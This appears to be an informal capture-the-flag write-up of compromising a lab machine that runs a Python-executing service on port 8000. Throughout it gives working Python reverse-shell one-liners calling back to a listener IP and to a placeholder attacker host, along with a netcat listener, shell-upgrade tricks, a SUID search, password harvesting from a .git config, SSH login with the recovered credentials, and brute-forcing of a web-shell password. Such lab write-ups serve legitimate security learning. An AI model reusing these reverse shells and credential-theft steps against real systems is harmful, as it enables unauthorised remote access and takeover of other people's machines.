1) scanned the ports with nmap   
2) 22, 8000 open  
3) didnt see any suspicious at the web server, just giving a simple text

4) connectted to http server through telnet and tried for the reverse shell, and thought it may work



### Task 1.0
```bash
telnet attack_ip 8000
# Its executiting the python instructions. so, i intially tried a direct reverse shell, like below, but it never worked
# import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")
# then i tried with python single instruction without pty. and turns out it worked and got reverse shell on my listener (eg: nc -lvnp 4444)
import socket, os, pty; (lambda s: (s.connect(("192.168.205.164", 4444)), [os.dup2(s.fileno(), f) for f in (0, 1, 2)], pty.spawn("bash")))(socket.socket())
or
import socket, os; (lambda s: (s.connect(("192.168.205.164", 4444)), [os.dup2(s.fileno(), f) for f in (0, 1, 2)], os.system("/bin/bash")))(socket.socket()) # worked

```
### Task 1.1
```bash
# listener side
nc -lvnp 4444
# tried by seeing any suid binary, but its unlucky
# find / -perm /4000 2>/dev/null
# after regouroous search, got a liitle insight, turns out its password for the think user

# make a better shell, intearactive
SHELL=/bin/bash script -q /dev/null
#or
#stty raw -echo && fg

# find the pass
cd /opt/dev/.git; cat config
```

### Task 2
```bash
# tried to ssh the attack machine with the think user
ssh think@attack_ip 
cat user.txt
```

### Task 3
- when we tried to connect to the http server, it seems like its asking credentials.
- i have tried entering the 'admin', it turns out asking the password.
- by taking this as chance, why cant i bruteforce
```bash
python3 pyrat.py # --> will give pass for the web shell
nc attack_ip 8000
> admin
> Password: abc123
```
